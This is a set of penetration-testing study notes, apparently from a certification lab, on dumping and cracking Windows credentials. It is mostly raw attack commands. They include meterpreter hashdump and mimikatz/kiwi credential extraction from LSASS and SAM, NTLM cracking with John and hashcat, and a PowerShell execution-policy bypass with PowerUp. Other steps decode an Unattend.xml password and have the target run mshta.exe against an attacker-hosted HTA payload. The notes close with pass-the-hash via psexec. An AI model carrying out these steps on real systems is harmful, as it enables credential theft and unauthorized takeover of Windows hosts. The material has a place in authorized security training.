# Windows Credential Dumping and Cracking

- **LSSAS service - Local Security Authority Subsystem Service**
	- stores cache of SAM database (Security Account Manager)
	- migrate to lsass process: pgrep lsass
	- meterpreter command: hashdump - copy/paste as-is in a file (hash_file)

- meterpreter module: mimikatz : load kiwi

- johntheripper: for ntlm hash
	- john --list=formats
	- john --format=NT hashes.txt --wordlist=<wordlist_path>

- hashcat
	- -m specifies hash_type. eg. 1000=ntlm
	- -a specifies attack_mode. eg 3=brute-force
	- hashcat -m 1000 -a3 <hash_file> <wordlist>	

Useful metasploit modules
	- auxiliary/analyze/crack_windows : set custom_wordlist 
	- run this module after running hashdump - once creds are stored in msfdb
	
	
# PowerUp

- https://github.com/PowerShellMafia/PowerSploit

- In target machine:
	- powershell -ep bypass (PowerShell execution policy bypass)
	- . .\PowerUp.ps1
	- Invoke-PrivescAudit - it will find misconfig files/leftover files like Unattend.xml
	- Get password from the Unattend.xml file, decode base64.
	- 
	  ```
	  $password='QWRtaW5AMTIz'
  	  $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
  	  echo $password
  	  ```
	- runas.exe /user:administrator cmd

- In attacker machine:
	- use exploit/windows/misc/hta_server
	- running the above module generates a .hta payload, run in cmd on target
	- on target cmd: mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta

# Mimikatz

- check [Host-based attacks > Windows > SMB](../Host%20Based%20Attacks/win-SMB.md)
- in meterpreter, first, migrate to lsass.exe process.
- syskey is used to encrypt sam db
- load kiwi
	- creds_all
	- las_dump_sam
	- lsa_dump_secrets
- alrenatively, create temp directory in C:\Temp and 
- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
- .\mimkatz.exe
	- privilege::debug - should return Privilege '20' OK
	- lsadump::sam
	- sekurlsa::logonpasswords
- Use psexec module for pass-the-hash attack